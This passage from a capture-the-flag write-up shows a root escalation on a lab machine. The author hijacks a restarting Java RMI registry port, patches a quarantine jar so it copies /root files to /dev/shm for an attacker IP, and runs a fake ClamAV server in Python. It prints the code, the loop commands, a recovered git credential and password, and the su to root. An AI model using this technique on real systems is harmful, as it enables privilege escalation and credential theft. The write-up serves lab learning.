2024/02/11 00:22:01 CMD: UID=0     PID=3560   | /bin/bash /root/check-vhosts.sh 
2024/02/11 00:22:01 CMD: UID=0     PID=3563   | /bin/bash /root/tomcat-app/reset.sh 
2024/02/11 00:23:01 CMD: UID=0     PID=3631   | /usr/local/sbin/vhosts-manage -m quarantine                                                      
2024/02/11 00:22:01 CMD: UID=0     PID=3565   | /usr/bin/java -jar /usr/share/vhost-manage/includes/quarantine.jar 
[snip]
2024/02/11 00:19:53 CMD: UID=999   PID=3077   | /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/registry.jar
```

If we can spin up our own RMI server in the time that the original `registry.jar` is restarting we can cause the client to connect to us and set a file to scan, as well as an output dir. This works because we can take over the port, and cause the other to error out. Because we dont have ClamAV set up to scan files it will just error and quarantine them in our specified folder. 

In RECAF we can change this line to have it scan the `/root` directory, place the files in `/dev/shm`, and set the scanner to our IP.
```java
private static final QuarantineConfiguration DEFAULT_CONFIG = new QuarantineConfiguration(new File("/dev/shm"), new File("/root"), "10.10.14.2", 3310, 1000);
```

We can export the program in RECAF
![registrytwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/registrytwo/20.png)

And copy it over to the machine and run in in a do while loop
```
while true; do java -jar zon.jar 2>/dev/null; done
```

I created this basic python3 script that will act as the clam server. It will tell the client that it is just malicoius
```python
#!/usr/bin/env python3

import socketserver

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        # Receive data from the client
        data_received = self.request.recv(1024).strip()

        # Print the received data
        print(f"Received data: {data_received.decode()}")

        # Send a response to the client indicating the filename
        response = b'filename: zon FOUND\0'
        self.request.sendall(response)

# Create a TCP server that listens on all available interfaces on port 3310
with socketserver.TCPServer(('0.0.0.0', 3310), MyTCPHandler) as server:
    print("Server is listening on 0.0.0.0:3310")

    # Keep the server running indefinitely
    server.serve_forever()

```

We can run a `while true` loop to continuously try and run our application and take over port 9002. It takes about 3-5 minutes.
```
developer@registry:~$ while true; do java -jar zon.jar 2>/dev/null; done  [+] Bound to 9002 
```

And we start getting hits on our web server:
```
b'zSCAN /root/.ssh/id_rsa\x00'
b'zSCAN /root/.ssh/authorized_keys\x00' 
b'zSCAN /root/.ssh/id_rsa.pub\x00'
b'zSCAN /root/root.txt\x00'
b'zSCAN /root/nginx/default\x00'
b'zSCAN /root/.git-credentials\x00'
b'zSCAN /root/tomcat-app/context.xml\x00'
b'zSCAN /root/tomcat-app/Dockerfile\x00'
b'zSCAN /root/tomcat-app/reset.sh\x00'
```

Looking at the `.git-credentials` was the same as before, credentials!
```
developer@registry:~$ find /dev/shm -name \*cred\*
/dev/shm/quarantine-run-2024-02-11T01:43:03.930332222/_root_.git-credentials
/dev/shm/quarantine-run-2024-02-11T01:42:04.474447799/_root_.git-credentials
/dev/shm/quarantine-run-2024-02-11T01:41:04.196769769/_root_.git-credentials

developer@registry:~$ cat /dev/shm/quarantine-run-2024-02-11T01:43:03.930332222/_root_.git-credentials
https://admin:52nWqz3tejiImlbsihtV@github.com
```

Using that I was able to log in as root!
```
developer@registry:~$ su root
Password: 52nWqz3tejiImlbsihtV
root@registry:/home/developer# cat /root/root.txt 
```
